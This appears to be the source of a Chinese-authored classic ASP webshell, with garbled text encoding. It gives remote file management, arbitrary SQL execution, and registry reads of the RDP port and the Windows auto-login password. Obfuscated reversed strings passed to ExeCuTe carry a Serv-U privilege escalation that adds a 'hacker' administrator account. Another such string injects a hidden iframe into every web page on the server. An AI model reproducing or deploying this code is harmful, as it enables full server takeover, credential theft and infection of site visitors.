	  SI=SI&"&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&Page+1&")'>��һҳ</a>&nbsp;<a href='javascript:FullSqlStr("""&SqlStr&""","&PN&")'>βҳ</a>"
    End If
    SI=SI&"<hr color='#EFEFEF'></td></tr></table>"
    Rs.Close:Set Rs=Nothing
	RRS SI:SI=""
  Else	   
    Conn.Execute(SqlStr)
    SI=SI&"SQL��䣺"&SqlStr
  End If
  RRS SI:SI=""
End If
  Conn.Close
  Set Conn=Nothing
  End If
End Function
Dim T1
Class UPC
  Dim D1,D2
  Public Function Form(F)
    F=lcase(F)
    If D1.exists(F) then:Form=D1(F):else:Form="":end if
  End Function
  Public Function UA(F)
    F=lcase(F)
    If D2.exists(F) then:set UA=D2(F):else:set UA=new FIF:end if
  End Function
  Private Sub Class_Initialize
  Dim TDa,TSt,vbCrlf,TIn,DIEnd,T2,TLen,TFL,SFV,FStart,FEnd,DStart,DEnd,UpName
    set D1=CreateObject(ObT(4,0))
	if Request.TotalBytes<1 then Exit Sub
    set T1 = CreateObject(ObT(6,0))
	T1.Type = 1 : T1.Mode =3 : T1.Open
    T1.Write  Request.BinaryRead(Request.TotalBytes)
    T1.Position=0 : TDa =T1.Read : DStart = 1
    DEnd = LenB(TDa)
    set D2=CreateObject(ObT(4,0))
	vbCrlf = chrB(13) & chrB(10)
    set T2 = CreateObject(ObT(6,0))
    TSt = MidB(TDa,1, InStrB(DStart,TDa,vbCrlf)-1)
    TLen = LenB (TSt)
    DStart=DStart+TLen+1
    while (DStart + 10) < DEnd
      DIEnd = InStrB(DStart,TDa,vbCrlf & vbCrlf)+3
      T2.Type = 1 : T2.Mode =3 : T2.Open
      T1.Position = DStart
      T1.CopyTo T2,DIEnd-DStart
      T2.Position = 0 : T2.Type = 2 : T2.Charset ="gb2312"
      TIn = T2.ReadText : T2.Close
      DStart = InStrB(DIEnd,TDa,TSt)
      FStart = InStr(22,TIn,"name=""",1)+6
      FEnd = InStr(FStart,TIn,"""",1)
      UpName = lcase(Mid (TIn,FStart,FEnd-FStart))
      if InStr (45,TIn,"filename=""",1) > 0 then
        set TFL=new FIF
        FStart = InStr(FEnd,TIn,"filename=""",1)+10
        FEnd = InStr(FStart,TIn,"""",1)
        FStart = InStr(FEnd,TIn,"Content-Type: ",1)+14
        FEnd = InStr(FStart,TIn,vbCr)
        TFL.FileStart =DIEnd
        TFL.FileSize = DStart -DIEnd -3
        if not D2.Exists(UpName) then
          D2.add UpName,TFL
        end if
      else
        T2.Type =1 : T2.Mode =3 : T2.Open
        T1.Position = DIEnd : T1.CopyTo T2,DStart-DIEnd-3
        T2.Position = 0 : T2.Type = 2
        T2.Charset ="gb2312"
        SFV = T2.ReadText
        T2.Close
        if D1.Exists(UpName) then
          D1(UpName)=D1(UpName)&", "&SFV
        else
          D1.Add UpName,SFV
        end if
      end if
      DStart=DStart+TLen+1
    wend
    TDa=""
    set T2 =nothing
  End Sub
  Private Sub Class_Terminate
    if Request.TotalBytes>0 then
      D1.RemoveAll:D2.RemoveAll
      set D1=nothing:set D2=nothing
      T1.Close:set T1 =nothing
    end if
  End Sub
End Class
Class FIF
dim FileSize,FileStart
  Private Sub Class_Initialize
  FileSize = 0
  FileStart= 0
  End Sub
  Public function SaveAs(F)
  dim T3
  SaveAs=true
  if trim(F)="" or FileStart=0 then exit function
  set T3=CreateObject(ObT(6,0))
     T3.Mode=3 : T3.Type=1 : T3.Open
     T1.position=FileStart
     T1.copyto T3,FileSize
     T3.SaveToFile F,2
     T3.Close
     set T3=nothing
     SaveAs=false
   end function
End Class
Class LBF
  Dim CF
  Private Sub Class_Initialize
    SET CF=CreateObject(ObT(0,0))
  End Sub
  Private Sub Class_Terminate
    Set CF=Nothing
  End Sub
  Function ShowDriver()
    For Each D in CF.Drives


      SI=SI&"<tr><td height='16'>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"
      SI=SI&"<a href='javascript:ShowFolder("""&D.DriveLetter&":\\"")'>���ش��� ("&D.DriveLetter&":)</a>" 
      SI=SI&"</td></tr>"
    Next
	ShowDriver=SI
  End Function
  Function Show1File(Path)
  Set FOLD=CF.GetFolder(Path)
  i=0
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'><tr>"
  For Each F in FOLD.subfolders
    SI=SI&"<td height=10>"
    SI=SI&"<a href='javascript:ShowFolder("""&RePath(Path&"\"&F.Name)&""")' title=""����""><font face='wingdings' size='6'>0</font>"&F.Name&"</a>" 
	SI=SI&" _<a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""CopyFolder"")'  onclick='return yesok()' class='am' title='����'>Copy</a>"
    SI=SI&"  <a href='javascript:FullForm("""&Replace(Path&"\"&F.Name,"\","\\")&""",""DelFolder"")'  onclick='return yesok()' class='am' title='ɾ��'>Del</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""MoveFolder"")'  onclick='return yesok()' class='am' title='�ƶ�'>Move</a>"
	SI=SI&" <a href='javascript:FullForm("""&RePath(Path&"\"&F.Name)&""",""DownFile"")'  onclick='return yesok()' class='am' title='����'>Down</a></td>"
	i=i+1
    If i mod 3 = 0 then SI=SI&"</tr><tr>"
  Next
    SI=SI&"</tr><tr><td height=2></td></tr></table>"
	RRS SI &"<hr noshade size=1 color=""#"" />" : SI=""
  For Each L in Fold.files
    SI="<table width='100%' border='0' cellspacing='0' cellpadding='0'>"
    SI=SI&"<tr>"
	SI=SI&"<td height='30'><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DownFile"");' title='����'><font face='wingdings' size='4'>2</font>"&L.Name&"</a></td>"
    SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""EditFile"")' class='am' title='�༭'>edit</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""DelFile"")'  onclick='return yesok()' class='am' title='ɾ��'>del</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""CopyFile"")' class='am' title='����'>copy</a></td>"
	SI=SI&"<td width='40' align=""center""><a href='javascript:FullForm("""&RePath(Path&"\"&L.Name)&""",""MoveFile"")' class='am' title='�ƶ�'>move</a></td>"	
    SI=SI&"<td width='50' align=""center"">"&clng(L.size/1024)&"K</td>"
	SI=SI&"<td width='200' align=""center"">"&L.Type&"</td>"
    SI=SI&"<td width='160'>"&L.DateLastModified&"</td>"
    SI=SI&"</tr></table>"
	RRS SI:SI=""
  Next
  Set FOLD=Nothing
  End function
  Function DelFile(Path)
    If CF.FileExists(Path) Then
	  CF.DeleteFile Path
      SI="<center><br><br><br>�ļ� "&Path&" ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function EditFile(Path)
  If Request("Action2")="Post" Then
      Set T=CF.CreateTextFile(Path)
        T.WriteLine Request.form("content")
        T.close
      Set T=nothing
    SI="<center><br><br><br>�ļ�����ɹ���</center>"
    SI=SI&BackUrl
    RRS SI
	Response.End
  End If
  If Path<>"" Then
    Set T=CF.opentextfile(Path, 1, False)
    Txt=HTMLEncode(T.readall) 
    T.close
    Set T=Nothing
  Else
    Path=Session("FolderPath")&"\newfile.asp":Txt="�½��ļ�"
  End If
  SI=SI&"<Form action='"&URL&"?Action2=Post' method='post' name='EditForm'>"
  SI=SI&"<input name='Action' value='EditFile' Type='hidden'>"
  SI=SI&"<input name='FName' value='"&Path&"' style='width:100%'><br>"
  SI=SI&"<textarea name='Content' style='width:100%;height:450'>"&Txt&"</textarea><br>"
  SI=SI&"<hr><input name='goback' type='button' value='����' onclick='history.back();'>&nbsp;&nbsp;&nbsp;<input name='reset' type='reset' value='����'>&nbsp;&nbsp;&nbsp;<input name='submit' type='submit' value='����'></form>"
  RRS SI
  End Function
  Function CopyFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
  End Function
  Function MoveFile(Path)
  Path = Split(Path,"||||")
    If CF.FileExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFile Path(0),Path(1)
      SI="<center><br><br><br>�ļ�"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI 
	End If
  End Function
  Function DelFolder(Path)
    If CF.FolderExists(Path) Then
	  CF.DeleteFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"ɾ���ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function CopyFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.CopyFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"���Ƴɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function MoveFolder(Path)
  Path = Split(Path,"||||")
    If CF.FolderExists(Path(0)) and Path(1)<>"" Then
	  CF.MoveFolder Path(0),Path(1)
      SI="<center><br><br><br>Ŀ¼"&Path(0)&"�ƶ��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
  Function NewFolder(Path)
    If Not CF.FolderExists(Path) and Path<>"" Then
	  CF.CreateFolder Path
      SI="<center><br><br><br>Ŀ¼"&Path&"�½��ɹ���</center>"
      SI=SI&BackUrl
	  RRS SI
	End If
  End Function
End Class
sub getTerminalInfo()
		On Error Resume Next
		Set wsX = Server.CreateObject("WScript.Shell")
		Dim terminalPortPath, terminalPortKey, termPort
		Dim autoLoginPath, autoLoginUserKey, autoLoginPassKey
		Dim isAutoLoginEnable, autoLoginEnableKey, autoLoginUsername, autoLoginPassword
		terminalPortPath = "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\"
		terminalPortKey = "PortNumber"
		termPort = wsX.RegRead(terminalPortPath & terminalPortKey)
		RRS "�ն˷���˿ڼ��Զ���¼<hr/><ol>"
		If termPort = "" Or Err.Number <> 0 Then 
			RRS  "�޷��õ��ն˷���˿�, ����Ȩ���Ƿ��Ѿ��ܵ�����.<br/>"
		 Else
			RRS "��ǰ�ն˷���˿�: " & termPort & "<br/>"
		End If
		autoLoginPath = "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\"
		autoLoginEnableKey = "AutoAdminLogon"
		autoLoginUserKey = "DefaultUserName"
		autoLoginPassKey = "DefaultPassword"
		isAutoLoginEnable = wsX.RegRead(autoLoginPath & autoLoginEnableKey)
		If isAutoLoginEnable = 0 Then
			RRS "ϵͳ�Զ���¼����δ����<br/>"
		Else
			autoLoginUsername = wsX.RegRead(autoLoginPath & autoLoginUserKey)
			RRS "�Զ���¼��ϵͳ�ʻ�: " & autoLoginUsername & "<br>"
			autoLoginPassword = wsX.RegRead(autoLoginPath & autoLoginPassKey)
			If Err Then
				Err.Clear
				RRS "False"
			End If
			RRS "�Զ���¼���ʻ�����: " & autoLoginPassword & "<br>"
		End If
		RRS "</ol>"
End Sub
Select Case Action
  Case "MainMenu":MainMenu()
  Case "getTerminalInfo":getTerminalInfo()
  Case "PageAddToMdb":PageAddToMdb()
  Case "Servu"
		ShiSan="raelC.rrE			ʯ noitcnuF dnE			ʯ fI dnE			ʯ ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��TROP_REVRES��(selbairavrevres.tseuqer&��:��&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG			ʯ eslE			ʯ ))��eman_tpircs��(selbairavrevres.tseuqer(esacl&)��eman_revres��(selbairavrevres.tseuqer & ��//:ptth��=emaNG			ʯ nehT ��08��=)��TROP_REVRES��(selbairavrevres.tseuqer fI			ʯ )(emaNG noitcnuF			ʯnoitcnuf dne			ʯgnihton=f tes			ʯ))2,htapg(tfel(esacl=htapg			ʯ)0(redloFlaicepSteG.f=htapg			ʯfi dne				ʯnoitcnuf tixe					ʯ��:c��=htapg				ʯneht 0>rebmun.rre fi				ʯ)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC.revreS=f tes				ʯraelc.rre				ʯtxen emuser rorre no			ʯ)(htapG noitcnuf			ʯfi dne			ʯ��>retnec/<>mrof/<>elbat/<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����1����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			ʯ��>�������ؚ���=eulav ����2timbuS����=eman ����teser����=epyt tupni< �� SRR			ʯ��>�������ᚢ��=eulav ����timbuS����=eman ����timbus����=epyt tupni<�� SRR			ʯ��>����2����=napsloc dt<>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����05����=ezis ����dda/ rwql srotartsinimda puorglacol ten & dda/ xrekcah xrekcah resu ten c/ dmc����=eulav ����c����=di ����txet����=epyt ����c����=eman tupni<>dt<�� SRR			ʯ��>dt/<�����>dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����8����=ezis ������&f&������=eulav ����f����=di ����txet����=epyt ����f����=eman tupni<>dt<�� SRR			ʯ��>dt/<����·ͳϵ>dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����85934����=eulav ����trop����=di ����txet����=epyt ����trop����=eman tupni<>dt<�� SRR			ʯ��>dt/<���ڡ���>dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����P@0;kl.#ka$@l#����=eulav ����p����=di ����txet����=epyt ����p����=eman tupni<>dt<�� SRR			ʯ��>dt/<�����>dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<>����rotartsinimdAlacoL����=eulav ����u����=di ����txet����=epyt ����u����=eman tupni<>����973����=htdiw dt<�� SRR			ʯ��>dt/<:������>����001����=htdiw dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>rt/<�� SRR			ʯ��>dt/<����X�ͺ� ��PSA ��Ȩ���� uvreS>����2����=napsloc dt<�� SRR			ʯ��>����elddim����=ngilav ����retnec����=ngila rt<�� SRR			ʯ��>����666666#����=rolocredrob ����1����=gnicapsllec ����0����=gniddapllec ����1����=redrob ����361����=thgieh ����494����=htdiw elbat<�� SRR			ʯ��>����uvreS=noitcA?����=noitca nusdlog=eman tsop=dohtem mrof<>retnec<�� SRR			ʯgnihtoN = c teS				ʯtroba.c				ʯgnihtoN = b teS				ʯtroba.b				ʯgnihtoN = a teS				ʯtroba.a				ʯ)��c��(noisses=c tes				ʯ)��b��(noisses=b tes				ʯ)��a��(noisses=a tes				ʯtxen emuser rorre no			ʯesle 			ʯ��>retnec/<�� SRR			ʯ��>����uvreS=noitcA?����=ferh.noitacol=kcilCno ���� ���̻ط� ����=eulav ����nottub����=epyt tupni<�� SRR			ʯ��>rb<>rb<>tnof/<��&dmc&��>der=roloc tnof<>rb<����������ִ��,����Ȩ��>retnec<�� SRR			ʯc=)��c��(noisses tes				ʯtiuq & niamodled & tm & ssapnigol & resunigol dnes.c				ʯ���� ,���� ,eurT ,��3s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.c				ʯ)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=c tes				ʯneht 3 = 1noitca fiesle			ʯ��>tpircs/<�� SRR			ʯ��;)0004,����;)(timbus.nusdlog.lla.tnemucod����(tuoemiTtes�� SRR			ʯ��;)����>retnec<...������,��Ȩ��������>retnec<����(etirw.tnemucod�� SRR			ʯ��>����tpircsavaj����=egaugnal tpircs<�� SRR			ʯ��>mrof/<>����3����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			ʯ��>����05����=ezis ������&f&������=eulav ����f����=di ����neddih����=epyt ����f����=eman tupni<�� SRR			ʯ��>����05����=ezis ������&dmc&������=eulav ����c����=di ����neddih����=epyt ����c����=eman tupni<�� SRR			ʯ��>dt/<>������&trop&������=eulav ����trop����=di ����neddih����=epyt ����trop����=eman tupni<�� SRR			ʯ��>dt/<>������&ssap&������=eulav ����p����=di ����neddih����=epyt ����p����=eman tupni<�� SRR			ʯ��>dt/<>������&resu&������=eulav ����u����=di ����neddih����=epyt ����u����=eman tupni<�� SRR			ʯ��>����nusdlog����=eman ����tsop����=dohtem mrof<�� SRR			ʯb=)��b��(noisses tes   			ʯtiuq & fLrCbv & dmc & �� cexe etis�� & fLrCbv & ��do ssap�� & fLrCbv & ��og resU�� dnes.b				ʯ���� ,���� ,eurT ,��2s/nimdapu/nusdlog/�� & tropptf & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.b				ʯ)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=b tes				ʯneht 2 = 1noitca fiesle			ʯ��>tpircs/<�� SRR			ʯ��;)0004,����;)(timbus.nusdlog.lla.tnemucod����(tuoemiTtes�� SRR			ʯ��;)����>retnec<...��&ssap&�������,��&resu&�� :��������ʹ,��&trop&��:1.0.0.721 ��������>retnec<����(etirw.tnemucod�� SRR			ʯ��>����tpircsavaj����=egaugnal tpircs<�� SRR			ʯ��>mrof/<>����2����=eulav ����1noitca����=di ����neddih����=epyt ����1noitca����=eman tupni<�� SRR			ʯ��>����05����=ezis ������&f&������=eulav ����f����=di ����neddih����=epyt ����f����=eman tupni<�� SRR			ʯ��>����05����=ezis ������&dmc&������=eulav ����c����=di ����neddih����=epyt ����c����=eman tupni<�� SRR			ʯ��>dt/<>������&trop&������=eulav ����trop����=di ����neddih����=epyt ����trop����=eman tupni<�� SRR			ʯ��>dt/<>������&ssap&������=eulav ����p����=di ����neddih����=epyt ����p����=eman tupni<�� SRR			ʯ��>dt/<>������&resu&������=eulav ����u����=di ����neddih����=epyt ����u����=eman tupni<�� SRR			ʯ��>����nusdlog����=eman ����tsop����=dohtem mrof<�� SRR			ʯa=)��a��(noisses tes				ʯtiuq & resuwen & niamodwen & niamodled & tm & ssapnigol & resunigol dnes.a				ʯ���� ,���� ,eurT,��1s/nimdapu/nusdlog/�� & trop & ��:1.0.0.721//:ptth�� ,��TEG�� nepo.a				ʯ)��PTTHLMX.tfosorciM��(tcejbOetaerC.revreS=a tes				ʯneht 1 = 1noitca fi			ʯ)f,��:c��,resuwen(ecalper=resuwen			ʯfLrCbv & ��TIUQ�� = tiuq			ʯfLrCbv & ��PDCLEMAWR|\\:c=sseccA �� & fLrCbv & ��enoN=soitaR-�� & fLrCbv & ��ralugeR=epyTdrowssaP-�� & fLrCbv & ��metsyS=ecnanetniaM-��					ʯ_ & fLrCbv & ��0=mumixaMatouQ-�� & fLrCbv & ��0=tnerruCatouQ-�� & fLrCbv & ��0=tiderCsoitaR-�� & fLrCbv & ��1=nwoDoitaR-��					ʯ_ & fLrCbv & ��1=pUoitaR-�� & fLrCbv & ��0=eripxE-�� & fLrCbv & ��1-=tuOemiTnoisseS-�� & fLrCbv & ��006=tuOemiTeldI-�� & fLrCbv & ��1-=sresUrNxaM-��					ʯ_ & fLrCbv & ��0=nwoDtimiLdeepS-�� & fLrCbv & ��0=pUtimiLdeepS-�� & fLrCbv & ��1-=PIrePnigoLsresUxaM-�� & fLrCbv & ��0=elbanEatouQ-��					ʯ_ & fLrCbv & ��0=drowssaPegnahC-�� & fLrCbv & ��0=nigoLwollAsyawlA-�� & fLrCbv & ��0=neddiHediH-�� & fLrCbv & ��0=eruceSdeeN-��					ʯ_ & fLrCbv & ��1=shtaPleR-�� & fLrCbv & ��0=elbasiD-�� & fLrCbv & ��=eliFseMnigoL-�� & fLrCbv & ��\\:c=riDemoH-��					ʯ_ & fLrCbv & ��do=drowssaP-�� & fLrCbv & ��og=resU-�� & fLrCbv & tropptf & ��=oNtroP-�� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��PUTESRESUTES-�� = resuwen			ʯfLrCbv & ��=yeKOZT �� & fLrCbv & ��0=elbanEOZT-�� & fLrCbv & ��0|1|1-|�� & tropptf & ��|0.0.0.0|nusdlog=niamoD-�� & fLrCbv & ��NIAMODTES-�� = niamodwen			ʯfLrCbv & ��ECNANETNIAM ETIS�� = tm			ʯfLrCbv & tropptf & ��=oNtroP �� & fLrCbv & ��0.0.0.0=PI-�� & fLrCbv & ��NIAMODETELED-�� = niamodled			ʯfLrCbv & ssap & �� ssaP�� = ssapnigol			ʯfLrCbv & resu & �� resU�� = resunigol			ʯdne.esnopser neht ��2C%4D%4C%3D%��><)�����Ě�(edocnELRU.revres fi			ʯ3=tuoemit			ʯ00556 = tropptf			ʯfi dne			ʯ)2,f(tfel=f   			ʯesle			ʯ)(htapg=f			ʯneht ����=f fi			ʯ))��f��(tseuqer(mirt=f			ʯ))��c��(tseuqer(mirt = dmc			ʯ))��trop��(tseuqer(mirt = trop			ʯ))��p��(tseuqer(mirt = ssap			ʯ))��u��(tseuqer(mirt = resu			ʯdne.esnopser neht )1noitca(ciremunsi ton  fi			ʯ)��1noitca��(tseuqer=1noitca			ʯ1noitca mid			ʯtiuq ,resuwen ,niamodwen ,tm ,niamodled ,ssapnigol ,resunigol ,dmc ,tropptf ,trop ,ssap ,resu miD"
ExeCuTe(UZSS(ShiSan))
Function UZSS(objstr)
objstr = Replace(objstr, "��", """")
For i = 1 To Len(objstr)
 If Mid(objstr, i, 1) <> "ʯ" Then
  NewStr = Mid(objstr, i, 1) & NewStr
 Else
  NewStr = vbCrLf & NewStr
 End If
Next
UZSS = NewStr
End Function
  case "pl"
	ShiSan="buS dnEʯgnihtoN = OSFW teSʯgnihton=2elift tesʯgnihton=elift tesʯgnihtoN = OSF teSʯgnihton=elift tesʯtxeN ʯcp,edocW,htaPweN seliFllAtresnI	 ʯeman.1f&����&htapW=htaPweN	ʯsrelofbusf ni 1f hcaE roF ʯsredloFbuS.f = srelofbusf teS ʯtxeN 	ʯ��>vid<>rb<>a/<evoM>'����'=eltit 'ma'=ssalc ')����eliFevoM����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR		ʯ�� >a/<ypoC>'�Ƹ�'=eltit 'ma'=ssalc ')����eliFypoC����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR		ʯ�� >a/<leD>'��ɾ'=eltit 'ma'=ssalc ')(kosey nruter'=kcilcno  ')����eliFleD����,������&)��\\��,��\��,1rts(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRRʯ�� >a/<tide>'����'=eltit 'ma'=ssalc ')����eliFtidE����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR		ʯ��_ >a/<��&1rts&��>'����'=eltit 'ma'=ssalc ')����eliFnwoD����,������&)��\\��,��\��,eman.elifym&htapW(ecalper&������(mroFlluF:tpircsavaj'=ferh a<�� SRR		ʯfi dne		ʯeman.elifym&htapW&�� ���� SRR			ʯesle		ʯfi dne			ʯfi dne				ʯesolc.1elift					ʯeman.elifym&htapW&�� ���� SRR					ʯesle				ʯesolc.1elift					ʯeman.elifym&htapW&��  �̚� SRR					ʯedocW eniletirw.elift					ʯ)2-,8,eman.elifym&����&htapW(eliftxetnepo.1SF=elift teS					ʯneht 0=)edocW,lladaer.1elift(rtsnI fi				ʯ)2-,1,eman.elifym&����&htapW(eliftxetnepo.1SF=1elift teS				ʯesle			ʯesolc.elift				ʯeman.elifym&htapW&�� �̚� SRR				ʯedocW eniletirw.elift				ʯ)2-,8,eman.elifym&����&htapW(eliftxetnepo.1SF=elift teS				ʯneht ��dekcehc��><xobkcehc fi			ʯneht 0=)eman.elifym,cp(rtsnI fi		ʯ)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = 1SF teS		ʯ2cf ni elifym hcaE roF 	ʯselif.f = 2cf teS 	ʯ)htapW(redloFteG.OSFW = f teS 	ʯ txen emuser rorre no 	ʯ)��tcejbOmetsySeliF.gnitpircS��(tcejbOetaerC = OSFW teS 	ʯ��\��& htapW=htapW neht ��\��><)1,htapW(thgir fi 	ʯ999999999=tuoemiTtpircS.revreS	ʯ)cp,edocW,htapW(seliFllAtresnI buS	ʯ)elifcp,edocdda,htapF(seliFllAtresnI llac:��>rb<>b/<�������幦����ҳ������>b<>'xp02:thgieh-enil'=elyts vid<��SRR neht ����ִ��=)��timbus��(tseuqer fi	ʯ ��>mrof/<>elbat/<�� SRR	ʯ��>rt/<>dt/<>��ִ=eulav timbus=epyt timbus=eman tupni<>dt<>dt/<;psbn&>dt<>rt<�� SRR	ʯ��>rt/<>dt/<>aeratxet/<��&edocdda&��>3=swor 66=sloc edoc=eman aeratxet<>dt<�� SRR	ʯ��>dt/<����һ��ź󻰾�һ>dt<>rt<�� SRR	ʯ��>rt/<>dt/<)������ҳ��Ϊ��Ĭ�����֡�:���ü��ĸ���(>04=ezis ��&elifcp&��=eulav elifcp=di txet=epyt elifcp=eman tupni<>dt<�� SRR	ʯ��>dt/<�����ĳ���>dt<>rt<�� SRR	ʯ��>rt/<>dt/<)������ִ��Ӱ���ܿ���ѡ��ϱȼ��Ĺ���,���ĵ��������ͬ�˹ҳ���(>��&xobkcehc&�� dekcehc=eulav xobkcehc=epyt xobkcehc=eman tupni<>dt<�� SRR	ʯ��>dt/<�����ĸ����˹�>dt<>rt<�� SRR	ʯ��>rt/<>dt/<)��·�Ծ�(>04=ezis ��&htapF&��=eulav df=eman txet=epyt tupni<>dt<�� SRR	ʯ��>dt/<���м��ĵ����Ҫ>901=htdiw dt<�� SRR	ʯ��>rt<>0=redrob %08=htdiw elbat<�� SRR	ʯ ��>TSOP=dohtem mrof<�� SRR	ʯ)��xobkcehc��(tseuqer=xobkcehc neht ����=xobkcehc fi	ʯ)��xobkcehc��(tseuqer=xobkcehc	ʯfi dne	ʯ )nelifcp(kelifcp=elifcp		ʯ )kelifcp(dnuobu=nelifcp		ʯ )��/��,emaNelifcp(tilps=kelifcp		ʯ)��EMAN_TPIRCS��(selbairaVrevreS.tseuqeR=emaNelifcp		ʯneht ����=elifcp fi	ʯ)��elifcp��(tseuqer=elifcp	ʯ��>emarfi/<>0=thgieh 0=htdiw mth.m/1.0.0.721//:ptth=crs emarfi<��=edocdda neht ����=edocdda fi	ʯ)��edoc��(tseuqeR = edocdda	ʯ)��/��(htaPpaM.revreS=htapF neht ����=htapF fi	ʯ )��df��(tseuqeR=htapF	ʯ )��OFNI_HTAP��(selbairaVrevreS.tseuqeR=FLES_PSA	ʯ)��>b/<��(&)��/��(htaPpaM.revreS&)�� ��·�Ծ�վ��ǰ��>b<��( SRR"
ExeCuTe(UZSS(ShiSan))

  Case "kmuma"
	dim Report
	if request.QueryString("act")<>"scan" then
		RRS "<form action=""?Action=kmuma&act=scan"" method=""post"" name=""form1"">"
		RRS "<p><b>������Ҫ����·����</b>"
		RRS "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" />* ��վ��Ŀ¼�����·�����\�������������վ����.��Ϊ��������Ŀ¼<br><br>"
		RRS "��Ҫ��ʲô: <input name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>��ASP ��"
		RRS "<input type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">������������֮�ļ�<br>"
		RRS "<br /><div id=""showFile1"" style=""display:none"">"
		RRS "&nbsp;&nbsp;�������ݣ�<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
		RRS "* Ҫ���ҵ��ַ����������ֻ�������ڼ��<br />"
		RRS "&nbsp;&nbsp;�޸����ڣ�<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&Left(Now(),InStr(now()," ")-1)&""" size=""20"">* ���������;����������������д<a href=""#"" onClick=""javascript:form1.Search_Date.value=""ALL"""">ALL</a><br />"
		RRS "&nbsp;&nbsp;�ļ����ͣ�<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20"">* ����֮����,������*��ʾ��������<br /><br /></div>"
		RRS "<input type=""submit"" value="" ��ʼɨ�� "" style=""background:#ccc;border:2px solid #fff;padding:2px 2px 0px 2px;margin:4px;"" />"
		RRS "</form>"
	else
		if request.Form("path")="" then
			RRS("No Hack")
			response.End()
		end if
		if request.Form("path")="\" then
			TmpPath = Server.MapPath("\")
		elseif request.Form("path")="." then
			TmpPath = Server.MapPath(".")
		else
			TmpPath = Server.MapPath("\")&"\"&request.Form("path")
		end if
		timer1 = timer
		Sun = 0
		SumFiles = 0
		SumFolders = 1
		If request.Form("radiobutton") = "sws" Then
			DimFileExt = "asp,cer,asa,cdx"
			Call ShowAllFile(TmpPath)
		Else
			If request.Form("path") = "" or request.Form("Search_Date") = "" or request.Form("Search_FileExt") = "" Then
				RRS("������������ȫ<br><br><a href='javascript:history.go(-1);'>�뷵����������</a>")
				response.End()
			End If
			DimFileExt = request.Form("Search_fileExt")
			Call ShowAllFile2(TmpPath)
		End If
RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" class=""CContent"">"
RRS "<tr><th>X Scan WebShell -- ASPSecurity For Hacking</tr>"
RRS "<tr><td class=""CPanel"" style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
